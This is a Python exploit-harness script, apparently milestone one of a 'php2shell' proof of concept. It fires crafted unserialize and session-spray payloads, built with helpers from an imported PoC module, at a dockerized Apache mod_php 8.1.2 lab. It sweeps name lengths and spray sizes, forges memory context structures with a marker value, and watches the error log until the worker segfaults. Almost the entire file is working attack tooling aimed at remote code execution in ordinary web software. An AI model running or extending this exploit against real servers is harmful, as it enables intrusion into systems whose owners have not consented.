#!/usr/bin/env python3
"""php2shell 8.1.2 container runner — milestone 1: marker SIGSEGV receipt.

Runs the package's documented 8.1 flow against the dockerized Apache
prefork + mod_php 8.1.2 single-child lab: arm -> p1 -> fire sweeps
(namelen x spray), detecting the worker kill via container error.log
('exit signal Segmentation fault') and connection resets.
"""
import subprocess, sys, os, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import poc_unserialize as P

URL = "http://127.0.0.1:18190/index.php"
BND = b"UctxPoc2026"
CONT = "php281"
LOG = "/tmp/php2shell81/error.log"

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def seg_count():
    r = sh(f"docker exec {CONT} grep -cE 'exit signal Segmentation|SIGSEGV|Segmentation fault' {LOG}")
    try:
        return int(r.stdout.strip() or 0)
    except ValueError:
        return 0

def tail_log(n=6):
    return sh(f"docker exec {CONT} tail -{n} {LOG}").stdout

def alive():
    return sh(f"curl -s -o /dev/null -m 4 {URL}").returncode == 0

def lab_up():
    sh(f"docker exec {CONT} bash /lab/lab81_setup.sh 18190 8M >/tmp/lab81.out 2>&1")
    print(sh("docker exec php281 cat /tmp/lab81.out").stdout.strip(), flush=True)

def restart_if_dead():
    if not alive():
        print("  worker dead -> restarting lab", flush=True)
        lab_up()
        return True
    return False

def main():
    lab_up()
    seg0 = seg_count()
    print("seg baseline:", seg0, flush=True)
    arm_nl = [int(x) for x in (sys.argv[1].split(",") if len(sys.argv) > 1
                               else ["98304", "131072", "262144"])]
    sprays = [int(x) for x in (sys.argv[2].split(",") if len(sys.argv) > 2
                               else ["200", "300", "450"])]
    sid = "u0123456789abcdefghijklmnopqrstuv"
    for NL in arm_nl:
        for i in range(3):
            # arm (+p1) establishes the orphan; fire sweeps look for the kill
            arm = P.arm_body(sid, BND, 20, NL)
            st, d, dt = P.send(URL, arm, BND, sid, 0.0, 0)
            p1 = P.fire1_body(sid, BND, 390 * 11000)
            st1, d1, dt1 = P.send(URL, p1, BND, sid, 0.0, 0)
            print(f"arm nl={NL} arm={st} p1={st1}", flush=True)
            if st is None:
                restart_if_dead(); continue
            for FS in sprays:
                fire = P.fire_body(sid, BND, FS,
                                   P.forge_ctx(P.MARKER, P.MARKER, used=1018,
                                               data0=P.MARK_DATA0),
                                   n_small=149)
                try:
                    st2, d2, dt2 = P.send(URL, fire, BND, sid, 0.0, 0)
                except Exception as e:
                    st2, dt2 = None, -1
                seg = seg_count()
                hit = b"4141414141414141" in d2 if isinstance(d2, bytes) else False
                print(f"  fire fs={FS} st={st2} dt={dt2:.2f} marker={hit} seg={seg}", flush=True)
                if seg > seg0:
                    print("==== SIGSEGV RECEIPT (nl=%d fs=%d) ====" % (NL, FS), flush=True)
                    print(tail_log(8), flush=True)
                    return
                restart_if_dead()
            sh(f"docker exec {CONT} rm -f /tmp/php2shell81/sess/sess_{sid}")
    print("no SIGSEGV this sweep", flush=True)

if __name__ == "__main__":
    main()
